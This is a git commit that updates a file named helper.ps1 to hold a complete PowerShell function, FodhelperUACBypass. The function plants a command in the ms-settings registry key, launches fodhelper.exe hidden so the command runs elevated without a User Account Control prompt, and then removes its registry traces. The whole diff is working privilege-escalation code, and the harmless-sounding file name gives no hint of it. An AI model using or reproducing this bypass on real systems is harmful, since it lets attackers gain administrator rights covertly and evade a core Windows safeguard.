d87f06c89fbb1e68b3b2f8df48568f36ac1bae2a
billhemmer2789 <97331850+billhemmer2789@users.noreply.github.com>
2022-01-15 22:11:33 -0600

    Update helper.ps1

--- helper.ps1
+++ helper.ps1
@@ -1,1 +1,19 @@
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force fodhelper.exe
+function FodhelperUACBypass(){ 
+ Param (
+           
+        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
+       )
+　
+    #Create Registry Structure
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+　
+    #Start fodhelper.exe
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+　
+    #Cleanup
+    Start-Sleep 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+　
+}
